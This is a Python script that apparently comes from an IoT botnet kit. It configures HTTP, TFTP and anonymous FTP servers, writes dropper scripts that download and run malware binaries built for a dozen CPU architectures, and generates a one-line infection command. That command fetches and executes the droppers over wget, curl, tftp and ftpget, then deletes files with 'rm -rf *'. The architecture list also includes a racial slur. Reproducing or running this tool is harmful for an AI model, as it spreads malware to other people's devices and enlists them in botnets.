import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "UwU"
exec_name = "Josh"
bin_prefix = ""
bin_directory = "OkamiBins"
archs = ["x.8.6",
"m.i.p.s",
"m.i.p.s.e.l",
"a.r.m",
"a.r.m.6",
"a.r.m.7",
"p.p.c",
"s.p.c",
"m.6.8.k",
"a.r.m.5",
"s.h.4",
"R.o.o.t.s.N.i.g.g.a"]
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/Josh.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Josh.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Josh.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/Josh2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Josh2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Josh2.sh')
run('echo "#!/bin/bash" > /var/www/html/Josh.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Josh2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Josh2.sh')
run('echo "#!/bin/bash" > /var/ftp/Josh1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/Josh1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/Josh1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/Josh.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/Josh1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/Josh.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/Josh2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
run("cp /var/www/html/Josh.sh /var/www/html/infect")
run("ulimit -s 999999;ulimit -SH 999999;ulimit -r 999999;ulimit -n 999999")
run("chmod 777 -R /var/www/html")
run("chmod 777 -R /var/lib/tftpboot/")

print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Josh.sh; curl -O http://" + ip + "/Josh.sh; chmod 777 Josh.sh; sh Josh.sh; tftp " + ip + " -c get Josh.sh; chmod 777 Josh.sh; sh Josh.sh; tftp -r Josh2.sh -g " + ip + "; chmod 777 Josh2.sh; sh Josh2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Josh1.sh Josh1.sh; sh Josh1.sh; rm -rf Josh.sh Josh.sh Josh2.sh Josh1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Josh.sh; curl -O http://" + ip + "/Josh.sh; chmod 777 Josh.sh; sh Josh.sh; tftp " + ip + " -c get Josh.sh; chmod 777 Josh.sh; sh Josh.sh; tftp -r Josh2.sh -g " + ip + "; chmod 777 Josh2.sh; sh Josh2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Josh1.sh Josh1.sh; sh Josh1.sh; rm -rf Josh.sh Josh.sh Josh2.sh Josh1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mYour payload has been generated and saved in payload.txt\033[0m")
